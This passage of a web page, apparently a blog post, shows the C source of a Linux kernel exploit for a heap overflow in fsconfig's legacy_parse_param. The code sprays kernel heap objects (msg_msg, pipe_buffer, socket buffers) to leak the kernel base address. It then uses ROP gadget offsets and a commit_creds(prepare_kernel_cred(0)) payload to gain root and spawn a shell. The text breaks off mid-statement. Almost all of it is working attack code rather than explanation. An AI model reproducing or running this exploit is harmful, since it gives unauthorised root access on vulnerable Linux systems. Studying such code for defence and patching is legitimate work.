class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sched.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/ipc.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/msg.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef __NR_fsconfig</span><br><span class="line">#define __NR_fsconfig 431</span><br><span class="line">#endif</span><br><span class="line">#ifndef __NR_fsopen</span><br><span class="line">#define __NR_fsopen 430</span><br><span class="line">#endif</span><br><span class="line">#define FSCONFIG_SET_STRING 1</span><br><span class="line">#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)</span><br><span class="line">#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)</span><br><span class="line">#ifndef PAGE_SIZE</span><br><span class="line">#define PAGE_SIZE 4096</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#define logd(fmt, ...) fprintf(stderr, (fmt), ##__VA_ARGS__)</span><br><span class="line">#define NUM_MSQIDS_1 (0x400)</span><br><span class="line">#define NUM_MSQIDS_2 (0x400)</span><br><span class="line">#define MSG_A_RAW_SIZE (0x1400 - 0x8)</span><br><span class="line">#define MSG_A_BUFF_SIZE (MSG_A_RAW_SIZE - sizeof(struct msg_msg))</span><br><span class="line">#define MSG_B_RAW_SIZE (0x400)</span><br><span class="line">#define MSG_B_BUFF_SIZE (MSG_B_RAW_SIZE - sizeof(struct msg_msg))</span><br><span class="line">#define MTYPE_A (0x41)</span><br><span class="line">#define MTYPE_B (0x42)</span><br><span class="line">#define MTYPE_FAKE (0x43)</span><br><span class="line">#define MSG_SIG (0x13371337)</span><br><span class="line">#define NUM_PIPES (0x100)</span><br><span class="line">#define NUM_SOCKETS (4)</span><br><span class="line">#define NUM_SKBUFFS (0x80)</span><br><span class="line"></span><br><span class="line">#define OFFSET_anon_pipe_buf_ops (0x103fac0)</span><br><span class="line">// 0xffffffff8173499c: push rsi; jmp qword ptr [rsi + 0x39];</span><br><span class="line">#define GADGET_stack_pivot1 (0x73499c)</span><br><span class="line">// 0xffffffff810e046d: pop rsp; ret;</span><br><span class="line">#define GADGET_stack_pivot2 (0x0e046d)</span><br><span class="line">#define OFFSET_prepare_kernel_cred (0x0c8540)</span><br><span class="line">#define OFFSET_commit_creds (0x0c80b0)</span><br><span class="line">/**</span><br><span class="line"> * 0xffffffff81b740b6:  mov    cr4,rbx</span><br><span class="line"> * 0xffffffff81b740b9:  test   rdx,rdx</span><br><span class="line"> * 0xffffffff81b740bc:  je     0xffffffff81b740d5</span><br><span class="line"> * ...</span><br><span class="line"> * 0xffffffff81b740d5:  jmp    r8</span><br><span class="line"> */</span><br><span class="line">#define GADGET_set_cr4 (0xb740b6)</span><br><span class="line">#define GADGET_pop_rdx (0x1255f5)</span><br><span class="line">#define GADGET_pop_r8 (0x524fb2)</span><br><span class="line">#define GADGET_pop_rbx (0x1255a3)</span><br><span class="line"></span><br><span class="line">struct trap_frame &#123;</span><br><span class="line">    uint64_t rip;</span><br><span class="line">    uint64_t cs;</span><br><span class="line">    uint64_t eflags;</span><br><span class="line">    uint64_t rsp;</span><br><span class="line">    uint64_t ss;</span><br><span class="line">&#125; __attribute__((packed)) tf;</span><br><span class="line">unsigned long user_cs, user_ss, user_eflags, user_sp;</span><br><span class="line"></span><br><span class="line">struct list_head &#123;</span><br><span class="line">    uint64_t next;</span><br><span class="line">    uint64_t prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct msg_msg &#123;</span><br><span class="line">    struct list_head m_list;</span><br><span class="line">    uint64_t m_type;</span><br><span class="line">    uint64_t m_ts;</span><br><span class="line">    uint64_t next;</span><br><span class="line">    uint64_t security;</span><br><span class="line">    char mtext[0];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct msg_msgseg &#123;</span><br><span class="line">    uint64_t next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct typ_msg_a &#123;</span><br><span class="line">    long mtype;</span><br><span class="line">    char mtext[MSG_A_BUFF_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct typ_msg_a_oob &#123;</span><br><span class="line">    long mtype;</span><br><span class="line">    char mtext[MSG_A_BUFF_SIZE + 0x400];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct typ_msg_b &#123;</span><br><span class="line">    long mtype;</span><br><span class="line">    char mtext[MSG_B_BUFF_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int sockfd;</span><br><span class="line">int sock_pairs[NUM_SOCKETS][2];</span><br><span class="line">int msqid_1[NUM_MSQIDS_1];</span><br><span class="line">int msqid_2[NUM_MSQIDS_2];</span><br><span class="line">struct typ_msg_a msg_a = &#123;0&#125;;</span><br><span class="line">struct typ_msg_a_oob msg_a_oob = &#123;0&#125;;</span><br><span class="line">struct typ_msg_b msg_b = &#123;0&#125;;</span><br><span class="line">int list1_corrupted_msqid = -1;</span><br><span class="line">int list2_leak_msqid = -1;</span><br><span class="line">int list2_leak_mtype = 0;</span><br><span class="line">uint64_t list2_uaf_msg_addr = 0;</span><br><span class="line">int list2_uaf_mtype = 0;</span><br><span class="line">uint64_t heap_buffer_addr = 0;</span><br><span class="line">int dummy_pipe[NUM_PIPES][2];</span><br><span class="line">uint64_t kbase = 0;</span><br><span class="line"></span><br><span class="line">void z() &#123;</span><br><span class="line">    logd(&quot;waiting...\n&quot;);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void die() &#123;</span><br><span class="line">    exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void get_shell() &#123;</span><br><span class="line">    int uid = getuid();</span><br><span class="line">    if (!uid || printf(&quot;[\033[1;31m-\033[0m] gain root fail, uid: %d\n&quot;, uid) &amp; 0) &#123;</span><br><span class="line">        puts(&quot;[\033[1;32m+\033[0m] root get!!&quot;);</span><br><span class="line">        execlp(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void init_tf_work(void) &#123;</span><br><span class="line">    asm(</span><br><span class="line">        &quot;movq %%cs, %0\n&quot;</span><br><span class="line">        &quot;movq %%ss, %1\n&quot;</span><br><span class="line">        &quot;movq %%rsp, %3\n&quot;</span><br><span class="line">        &quot;pushfq\n&quot;</span><br><span class="line">        &quot;popq %2\n&quot;</span><br><span class="line">        : &quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_eflags), &quot;=r&quot;(user_sp)</span><br><span class="line">        :</span><br><span class="line">        : &quot;memory&quot;);</span><br><span class="line"></span><br><span class="line">    asm(&quot;mov %cs,%rax;pushq %rax;popq tf+8;&quot; // set cs</span><br><span class="line">        &quot;pushf;popq tf+16;&quot;                  // set eflags</span><br><span class="line">        &quot;mov %ss,%rax;pushq %rax;popq tf+32;&quot;);</span><br><span class="line">    tf.rip = (uint64_t)&amp;get_shell;</span><br><span class="line">    tf.rsp = 0xf000 + (uint64_t)mmap(0, 0x10000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void payload(void) &#123; // &lt;--- kernel jump here (cr4 0x6f0)</span><br><span class="line">#define KERNCALL __attribute__((regparm(3)))</span><br><span class="line">    void *(*prepare_kernel_cred)(void *)KERNCALL = (void *)kbase + OFFSET_prepare_kernel_cred;</span><br><span class="line">    void (*commit_creds)(void *) KERNCALL = (void *)kbase + OFFSET_commit_creds;</span><br><span class="line">    commit_creds(prepare_kernel_cred(0));</span><br><span class="line">    asm(&quot;swapgs;mov $tf,%rsp;iretq;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hexdump(const void *data, size_t size) &#123;</span><br><span class="line">    char ascii[17];</span><br><span class="line">    size_t i, j;</span><br><span class="line">    ascii[16] = &#x27;\0&#x27;;</span><br><span class="line">    for (i = 0; i &lt; size; ++i) &#123;</span><br><span class="line">        logd(&quot;%02X &quot;, ((unsigned char *)data)[i]);</span><br><span class="line">        if (((unsigned char *)data)[i] &gt;= &#x27; &#x27; &amp;&amp; ((unsigned char *)data)[i] &lt;= &#x27;~&#x27;) &#123;</span><br><span class="line">            ascii[i % 16] = ((unsigned char *)data)[i];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            ascii[i % 16] = &#x27;.&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        if ((i + 1) % 8 == 0 || i + 1 == size) &#123;</span><br><span class="line">            logd(&quot; &quot;);</span><br><span class="line">            if ((i + 1) % 16 == 0) &#123;</span><br><span class="line">                logd(&quot;|  %s \n&quot;, ascii);</span><br><span class="line">            &#125; else if (i + 1 == size) &#123;</span><br><span class="line">                ascii[(i + 1) % 16] = &#x27;\0&#x27;;</span><br><span class="line">                if ((i + 1) % 16 &lt;= 8) &#123;</span><br><span class="line">                    logd(&quot; &quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                for (j = (i + 1) % 16; j &lt; 16; ++j) &#123;</span><br><span class="line">                    logd(&quot;   &quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                logd(&quot;|  %s \n&quot;, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void init_unshare() &#123;</span><br><span class="line">    int fd;</span><br><span class="line">    char buff[0x100];</span><br><span class="line"></span><br><span class="line">    // strace from `unshare -Ur xxx`</span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER);</span><br><span class="line"></span><br><span class="line">    fd = open(&quot;/proc/self/setgroups&quot;, O_WRONLY);</span><br><span class="line">    snprintf(buff, sizeof(buff), &quot;deny&quot;);</span><br><span class="line">    write(fd, buff, strlen(buff));</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    fd = open(&quot;/proc/self/uid_map&quot;, O_WRONLY);</span><br><span class="line">    snprintf(buff, sizeof(buff), &quot;0 %d 1&quot;, getuid());</span><br><span class="line">    write(fd, buff, strlen(buff));</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    fd = open(&quot;/proc/self/gid_map&quot;, O_WRONLY);</span><br><span class="line">    snprintf(buff, sizeof(buff), &quot;0 %d 1&quot;, getgid());</span><br><span class="line">    write(fd, buff, strlen(buff));</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void init_msq() &#123;</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">        msqid_1[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);</span><br><span class="line">        if (msqid_1[i] &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] msgget() fail\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_2; i++) &#123;</span><br><span class="line">        msqid_2[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);</span><br><span class="line">        if (msqid_2[i] &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] msgget() fail\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void init_sock() &#123;</span><br><span class="line">    sockfd = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">    if (sockfd &lt; 0) &#123;</span><br><span class="line">        logd(&quot;[-] socket() fail\n&quot;);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_pairs[i]) &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] socketpair() fail\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void clean_msq_1() &#123;</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">        msgrcv(msqid_1[i], &amp;msg_a, sizeof(msg_a.mtext), MTYPE_A, IPC_NOWAIT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void clean_msq_2() &#123;</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_2; i++) &#123;</span><br><span class="line">        for (int j = 0; j &lt; 0x10; j++) &#123;</span><br><span class="line">            msgrcv(msqid_2[i], &amp;msg_b, sizeof(msg_b.mtext), MTYPE_B | (j &lt;&lt; 8), IPC_NOWAIT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void clean_pipe() &#123;</span><br><span class="line">    for (int i = 0; i &lt; NUM_PIPES; i++) &#123;</span><br><span class="line">        char buffer[0x100];</span><br><span class="line">        read(dummy_pipe[i][0], buffer, 0x100);</span><br><span class="line">        close(dummy_pipe[i][0]);</span><br><span class="line">        close(dummy_pipe[i][1]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void bind_cpu() &#123;</span><br><span class="line">    cpu_set_t my_set;</span><br><span class="line">    CPU_ZERO(&amp;my_set);</span><br><span class="line">    CPU_SET(0, &amp;my_set);</span><br><span class="line">    if (sched_setaffinity(0, sizeof(cpu_set_t), &amp;my_set)) &#123;</span><br><span class="line">        perror(&quot;sched_setaffinity&quot;);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int call_fsopen() &#123;</span><br><span class="line">    int fd = fsopen(&quot;ext4&quot;, 0);</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        perror(&quot;fsopen&quot;);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    return fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void spray_skbuff_data(void *ptr, size_t size) &#123;</span><br><span class="line">    for (int i = 0; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">        for (int j = 0; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">            if (write(sock_pairs[i][0], ptr, size) &lt; 0) &#123;</span><br><span class="line">                logd(&quot;[-] write to sock pairs failed\n&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void free_skbuff_data(void *ptr, size_t size) &#123;</span><br><span class="line">    for (int i = 0; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">        for (int j = 0; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">            if (read(sock_pairs[i][1], ptr, size) &lt; 0) &#123;</span><br><span class="line">                logd(&quot;[-] read from sock pairs failed\n&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t exploit_step1(int fd) &#123;</span><br><span class="line">    char buff[0x1000];</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * padding ctx-&gt;legacy_data to</span><br><span class="line">     * ------</span><br><span class="line">     * 0x0FE0: BBBB BBBB - BBBB BBBB</span><br><span class="line">     * 0x0FF0: BBBB BBBB - BBBB BBB?</span><br><span class="line">     * 0x1000: ???? ???? - ???? ????</span><br><span class="line">     *</span><br><span class="line">     * so next write will overwrite next page,</span><br><span class="line">     * ------</span><br><span class="line">     * 0x0FF0: BBBB BBBB - BBBB BBB,</span><br><span class="line">     * 0x1000: =XXX XXXX - XXXX XXXX</span><br><span class="line">     */</span><br><span class="line">    logd(&quot;[*] prepare fsconfig heap overflow\n&quot;);</span><br><span class="line">    memset(buff, 0, sizeof(buff));</span><br><span class="line">    memset(buff, &#x27;A&#x27;, 0x100 - 2);</span><br><span class="line">    for (int i = 0; i &lt; 0xf; i++) &#123;</span><br><span class="line">        fsconfig(fd, FSCONFIG_SET_STRING, &quot;\x00&quot;, buff, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    memset(buff, 0, sizeof(buff));</span><br><span class="line">    memset(buff, &#x27;B&#x27;, 0x100 - 3);</span><br><span class="line">    fsconfig(fd, FSCONFIG_SET_STRING, &quot;\x00&quot;, buff, 0);</span><br><span class="line"></span><br><span class="line">    // alloc msg_msg with 0x1000(-0x30) body and 0x400(-0x08) msg_msgseg</span><br><span class="line">    logd(&quot;[*] sparying msg_msg ...\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">        memset(&amp;msg_a, 0, sizeof(msg_a));</span><br><span class="line">        msg_a.mtype = MTYPE_A;</span><br><span class="line">        memset(msg_a.mtext, &#x27;Q&#x27;, sizeof(msg_a.mtext));</span><br><span class="line">        ((int *)&amp;msg_a.mtext)[0] = MSG_SIG;</span><br><span class="line">        ((int *)&amp;msg_a.mtext)[1] = i;</span><br><span class="line">        if (msgsnd(msqid_1[i], &amp;msg_a, sizeof(msg_a.mtext), 0) &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] msgsnd() fail\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // trigger oob write to overwrite msg_msg.m_ts (hopes)</span><br><span class="line">    logd(&quot;[*] trigger oob write in `legacy_parse_param` to corrupt msg_msg.m_ts\n&quot;);</span><br><span class="line">    memset(buff, 0, sizeof(buff));</span><br><span class="line">    strcat(buff, &quot;0000000&quot;);  // m_list.next</span><br><span class="line">    strcat(buff, &quot;11111111&quot;); // m_list.prev</span><br><span class="line">    strcat(buff, &quot;22222222&quot;); // m_type</span><br><span class="line">    uint64_t target_size = sizeof(msg_a_oob.mtext);</span><br><span class="line">    memcpy(buff + strlen(buff), &amp;target_size, 2);</span><br><span class="line">    fsconfig(fd, FSCONFIG_SET_STRING, &quot;\x00&quot;, buff, 0);</span><br><span class="line"></span><br><span class="line">    // recv from buffer to see if leak success</span><br><span class="line">    logd(&quot;[*] search corrupted msg_msg ...\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">        // logd(&quot;recving...\n&quot;);</span><br><span class="line">        ssize_t copy_size = msgrcv(msqid_1[i], &amp;msg_a_oob, sizeof(msg_a_oob.mtext), 0, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">        if (copy_size &lt; 0) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        if (copy_size == sizeof(msg_a_oob.mtext)) &#123;</span><br><span class="line">            logd(&quot;[+] corrupted msg_msg found, id: %d\n&quot;, msqid_1[i]);</span><br><span class="line">            list1_corrupted_msqid = msqid_1[i];</span><br><span class="line">            msqid_1[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);</span><br><span class="line">            uint64_t *oob_data = (uint64_t *)(msg_a_oob.mtext + sizeof(msg_a.mtext));</span><br><span class="line">            size_t oob_size = sizeof(msg_a_oob.mtext) - sizeof(msg_a.mtext);</span><br><span class="line">            if (memcmp(&amp;oob_data[1], &quot;QQQQQQQQ&quot;, 8)) &#123; // &#x27;QQQQQQQQ&#x27;</span><br><span class="line">                logd(&quot;[!] but the next object is not allocated by msg_msgseg\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (list1_corrupted_msqid &lt; 0) &#123;</span><br><span class="line">        logd(&quot;[!] can&#x27;t found corrupted msg_msg, and kernel may crash :(\n&quot;);</span><br><span class="line">        clean_msq_1();</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // clean uncorrupted msg_msg</span><br><span class="line">    logd(&quot;[*] clean unused msg_msg ...\n&quot;);</span><br><span class="line">    clean_msq_1();</span><br><span class="line"></span><br><span class="line">    if (!kbase) &#123;</span><br><span class="line">        // realloc 0x400 slab with sizeof(struct pipe_buffer)*PIPE_DEF_BUFFERS == 0x280</span><br><span class="line">        logd(&quot;[*] alloc `struct pipe_buffer` to re-acquire the 0x400 slab freed by msg_msgseg ...\n&quot;);</span><br><span class="line">        for (int i = 0; i &lt; NUM_PIPES; i++) &#123;</span><br><span class="line">            if (pipe(dummy_pipe[i])) &#123;</span><br><span class="line">                logd(&quot;[-] Alloc pipe failed\n&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            write(dummy_pipe[i][1], buff, 0x100);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // hope leak happen</span><br><span class="line">        uint64_t anon_pipe_buf_ops = 0;</span><br><span class="line">        &#123;</span><br><span class="line">            ssize_t copy_size = msgrcv(list1_corrupted_msqid, &amp;msg_a_oob, sizeof(msg_a_oob.mtext), 0, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">            if ((copy_size &lt; 0) || (copy_size != sizeof(msg_a_oob.mtext))) &#123;</span><br><span class="line">                logd(&quot;[-] recv from corrupted msg_msg failed\n&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            uint64_t *oob_data = (uint64_t *)(msg_a_oob.mtext + sizeof(msg_a.mtext));</span><br><span class="line">            size_t oob_size = sizeof(msg_a_oob.mtext) - sizeof(msg_a.mtext);</span><br><span class="line">            if (((oob_data[2] ^ OFFSET_anon_pipe_buf_ops) &amp; (PAGE_SIZE - 1)) != 0) &#123;</span><br><span class="line">                logd(&quot;[-] bad luck, we don&#x27;t catch pipe_buffer\n&quot;);</span><br><span class="line"></span><br><span class="line">                // close pipe</span><br><span class="line">                clean_pipe();</span><br><span class="line">                return 1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            logd(&quot;[*] it works :)\n&quot;);</span><br><span class="line">            hexdump(msg_a_oob.mtext + sizeof(msg_a.mtext), 0x28);</span><br><span class="line">            anon_pipe_buf_ops = oob_data[2];</span><br><span class="line">            logd(&quot;[+] leak anon_pipe_buf_ops: 0x%lx\n&quot;, anon_pipe_buf_ops);</span><br><span class="line">        &#125;</span><br><span class="line">        kbase = anon_pipe_buf_ops - OFFSET_anon_pipe_buf_ops;</span><br><span class="line">        if ((kbase &amp; (PAGE_SIZE - 1)) != 0) &#123;</span><br><span class="line">            logd(&quot;[-] kbase not page aligned\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            logd(&quot;[+] get kernel base: 0x%lx\n&quot;, kbase);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // delete pipe</span><br><span class="line">        clean_pipe();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // realloc 0x400 slab with msg_msg</span><br><span class="line">    logd(&quot;[*] alloc `struct msg_msg` to re-acquire the 0x400 slab freed by msg_msgseg ...\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_2; i++) &#123;</span><br><span class="line">        memset(&amp;msg_b, 0, sizeof(msg_b));</span><br><span class="line">        memset(msg_b.mtext, &#x27;W&#x27;, sizeof(msg_b.mtext));</span><br><span class="line">        ((int *)&amp;msg_b.mtext)[0] = MSG_SIG;</span><br><span class="line">        ((int *)&amp;msg_b.mtext)[1] = i;</span><br><span class="line">        for (int j = 0; j &lt; 0x10; j++) &#123;</span><br><span class="line">            msg_b.mtype = MTYPE_B | (j &lt;&lt; 8);</span><br><span class="line">            if (msgsnd(msqid_2[i], &amp;msg_b, sizeof(msg_b.mtext), 0) &lt; 0) &#123;</span><br><span class="line">                logd(&quot;[-] msgsnd() fail\n&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // hope leak happen</span><br><span class="line">    &#123;</span><br><span class="line">        ssize_t copy_size = msgrcv(list1_corrupted_msqid, &amp;msg_a_oob, sizeof(msg_a_oob.mtext), 0, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">        if ((copy_size &lt; 0) || (copy_size != sizeof(msg_a_oob.mtext))) &#123;</span><br><span class="line">            logd(&quot;[-] recv from corrupted msg_msg failed\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        uint64_t *oob_data = (uint64_t *)(msg_a_oob.mtext + sizeof(msg_a.mtext));</span><br><span class="line">        size_t oob_size = sizeof(msg_a_oob.mtext) - sizeof(msg_a.mtext);</span><br><span class="line">        struct msg_msg *p = (struct msg_msg *)oob_data;</span><br><span class="line">        if (((int *)&amp;p-&gt;mtext)[0] != MSG_SIG) &#123;</span><br><span class="line">            logd(&quot;[-] bad luck, we don&#x27;t catch 0x400 msg_msg\n&quot;);</span><br><span class="line">            clean_msq_2();</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        logd(&quot;[*] it works :)\n&quot;);</span><br><span class="line"></span><br><span class="line">        list2_leak_msqid = msqid_2[((int *)&amp;p-&gt;mtext)[1]];</span><br><span class="line">        list2_leak_mtype = p-&gt;m_type;</span><br><span class="line">        list2_uaf_msg_addr = p-&gt;m_list.prev;</span><br><span class="line">        list2_uaf_mtype = p-&gt;m_type - 0x0100;</span><br><span class="line">        msqid_2[((int *)&amp;p-&gt;mtext)[1]] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);</span><br><span class="line">        hexdump(msg_a_oob.mtext + sizeof(msg_a.mtext), 0x40);</span><br><span class="line">        logd(&quot;[+] leak list2_leak_msqid: %d\n&quot;, list2_leak_msqid);</span><br><span class="line">        logd(&quot;[+] leak list2_leak_mtype: 0x%x\n&quot;, list2_leak_mtype);</span><br><span class="line">        logd(&quot;[+] leak list2_uaf_msg_addr: 0x%lx\n&quot;, list2_uaf_msg_addr);</span><br><span class="line">        logd(&quot;[+] leak list2_uaf_mtype: 0x%x\n&quot;, 